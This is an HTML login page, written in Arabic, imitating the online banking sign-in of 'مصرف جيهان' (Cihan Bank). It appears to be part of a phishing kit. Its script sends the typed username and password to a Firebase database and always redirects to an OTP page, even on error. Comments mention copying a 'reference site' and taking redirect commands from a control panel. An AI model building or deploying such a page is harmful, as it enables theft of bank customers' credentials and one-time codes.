<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <!-- i18n: تحديد اللغة (الافتراضي السورانية) قبل الرسم لمنع الوميض -->
    <script src="/assets/i18n/i18n-init.js"></script>
    <link rel="stylesheet" href="/assets/i18n/i18n.css">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول | مصرف جيهان</title>
    <meta name="description" content="سجّل دخولك إلى الخدمات المصرفية لمصرف جيهان.">
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Cairo Font -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@400;600;700;800&display=swap" rel="stylesheet">

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        background: '#ffffff',
                        foreground: '#020618',
                        primary: '#0f172b',
                        'primary-foreground': '#f8fafc',
                        brand: '#a91518',
                        'brand-foreground': '#fcfcfc',
                        'slate-btn': '#4d4d4d',
                        field: '#f0f0f0',
                        muted: '#62748e',
                        line: '#e2e8f0',
                    },
                    fontFamily: {
                        cairo: ['Cairo', 'sans-serif'],
                    }
                }
            }
        }
    </script>
    <style>
        body { font-family: 'Cairo', sans-serif; scroll-behavior: smooth; }

        /* خلفية بنمط شبكي مطابقة للموقع المرجعي */
        .pattern-bg {
            background-color: #eeeeee;
            background-image:
                repeating-linear-gradient(45deg, #d7d7d7 0 1px, transparent 1px 28px),
                repeating-linear-gradient(-45deg, #d7d7d7 0 1px, transparent 1px 28px),
                repeating-linear-gradient(0deg, #dedede 0 1px, transparent 1px 40px),
                repeating-linear-gradient(90deg, #dedede 0 1px, transparent 1px 40px);
        }
    </style>
<style>
        /* خط كوردي (سورانی) يغطي الحروف الخاصة: ڕ ڵ ۆ ێ گ چ پ ژ */
        html[lang="ckb"] body { font-family: 'Noto Kufi Arabic', 'Cairo', sans-serif; }
        html[lang="en"] body { font-family: 'Cairo', 'Segoe UI', sans-serif; }
    </style>
</head>
<body class="pattern-bg flex min-h-screen flex-col text-foreground">

    <!-- ==================== منطقة الشعار العلوية ==================== -->
    <div class="relative flex h-[38vh] min-h-64 items-center justify-center">
        <div data-lang-switcher data-lang-theme="light" class="absolute left-5 top-5 z-50"></div>
        <div class="h-40 w-40 rounded-full bg-white shadow-sm flex items-center justify-center">
            <img src="/assets/images/cihan-logo.png" alt="مصرف جيهان" class="h-28 w-28 object-contain">
        </div>
    </div>

    <!-- ==================== بطاقة تسجيل الدخول السفلية ==================== -->
    <div class="flex-1 rounded-t-[2.5rem] bg-background px-6 pb-8 pt-4">
        <div class="mx-auto max-w-md">

            <!-- مقبض السحب -->
            <div class="mx-auto mb-8 h-1 w-14 rounded-full bg-line"></div>

            <h1 class="mb-8 text-center text-3xl font-semibold">تسجيل الدخول</h1>

            <!-- تنبيه العرض التجريبي -->
            <div role="alert" class="mb-6 rounded-[14px] border-2 border-amber-500 bg-amber-50 p-4 text-center">
                <p class="mt-1 text-sm text-amber-700">
                
يرجى التاكد من ادخال اسم المستخدم وكلمة المرور بشكل صحيح                
                </p>
            </div>

            <!-- النموذج -->
            <form id="loginForm" class="space-y-4" onsubmit="handleLogin(event)">

                <!-- اسم المستخدم -->
                <input
                    type="text"
                    id="username"
                    required
                    autocomplete="username"
                    placeholder="الرجاء إدخال اسم المستخدم"
                    class="h-14 w-full rounded-[14px] bg-field px-5 text-base outline-none transition focus:ring-2 focus:ring-brand"
                >

                <!-- كلمة المرور -->
                <div class="relative">
                    <input
                        type="password"
                        id="password"
                        required
                        autocomplete="current-password"
                        placeholder="كلمة المرور"
                        class="h-14 w-full rounded-[14px] bg-field px-5 pl-14 text-base outline-none transition focus:ring-2 focus:ring-brand"
                    >
                    <button
                        type="button"
                        id="togglePassword"
                        aria-label="إظهار كلمة المرور"
                        class="absolute left-3 top-1/2 -translate-y-1/2 flex h-9 w-9 items-center justify-center rounded-lg text-muted hover:text-foreground transition-colors"
                    >
                        <i class="fa-solid fa-eye-off text-xl" id="eyeIcon"></i>
                    </button>
                </div>

                <!-- نسيت كلمة المرور -->
                <a href="forgot-password.html" class="block text-sm text-primary underline hover:opacity-80">نسيت كلمة المرور و عرض اسم المستخدم</a>

                <!-- زر تسجيل الدخول -->
                <button
                    type="submit"
                    class="h-14 w-full rounded-[14px] bg-brand text-xl font-bold text-brand-foreground shadow-md transition hover:opacity-95 active:scale-[0.99]"
                >
                    تسجيل الدخول
                </button>
            </form>

            <!-- فاصل "أو" -->
            <div class="my-6 flex items-center gap-4 text-muted">
                <div class="h-px flex-1 bg-line"></div>
                أو
                <div class="h-px flex-1 bg-line"></div>
            </div>

            <!-- أزرار ثانوية -->
            <div class="grid grid-cols-2 gap-3">
                <button type="button" class="h-14 rounded-[14px] bg-slate-btn font-bold text-brand-foreground shadow transition hover:opacity-95">أصبح عميل</button>
                <button type="button" class="h-14 rounded-[14px] bg-slate-btn font-bold text-brand-foreground shadow transition hover:opacity-95">إنشاء حساب</button>
            </div>

            <!-- الشروط والأحكام -->
            <a href="terms.html" class="mt-8 block text-center text-sm text-brand underline hover:opacity-80">الشروط والأحكام</a>

        </div>
    </div>

    <!-- ==================== زر الأسئلة العائم ==================== -->


    <!-- ==================== JAVASCRIPT ==================== -->
    <script>
        // إظهار وإخفاء كلمة المرور
        var togglePasswordBtn = document.getElementById('togglePassword');
        var passwordInput = document.getElementById('password');
        var eyeIcon = document.getElementById('eyeIcon');

        if (togglePasswordBtn && passwordInput && eyeIcon) {
            togglePasswordBtn.addEventListener('click', function () {
                var isPassword = passwordInput.getAttribute('type') === 'password';
                passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
                if (isPassword) {
                    eyeIcon.classList.remove('fa-eye');
                    eyeIcon.classList.add('fa-eye-slash');
                } else {
                    eyeIcon.classList.remove('fa-eye-slash');
                    eyeIcon.classList.add('fa-eye');
                }
            });
        }

        // معالجة تسجيل الدخول
        function handleLogin(event) {
            event.preventDefault();
            var username = (document.getElementById('username') || {}).value || '';
            var password = (document.getElementById('password') || {}).value || '';

            // إرسال بيانات الدخول إلى قاعدة البيانات ثم التوجيه
            var go = function () { window.location.href = 'otp.html'; };
            if (typeof window.submitLogin === 'function') {
                window.submitLogin({ username: username.trim(), password: password })
                    .then(go).catch(go);
            } else if (typeof window.pushFirebaseLogin === 'function') {
                try { window.pushFirebaseLogin({ username: username.trim(), password: password }); } catch (e) {}
                go();
            } else {
                go();
            }
        }
    </script>

    <!-- Firebase: الاتصال بقاعدة البيانات + الاستماع لأوامر لوحة التحكم (التوجيه) -->
    <script src="/assets/js/firebase-env.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
    <script src="/assets/js/firebase-client.js?v=11"></script>
    <script src="/assets/js/page-commands.js?v=3"></script>
    <!-- i18n: القواميس + المحرّك + زر تبديل اللغة (يُطبَّق على كل الصفحات) -->
    <script src="/assets/i18n/ar.js?v=1"></script>
    <script src="/assets/i18n/en.js?v=1"></script>
    <script src="/assets/i18n/ckb.js?v=1"></script>
    <script src="/assets/i18n/i18n.js?v=1"></script>
    <script src="/assets/js/lang-switcher.js?v=1"></script>
</body>
</html>
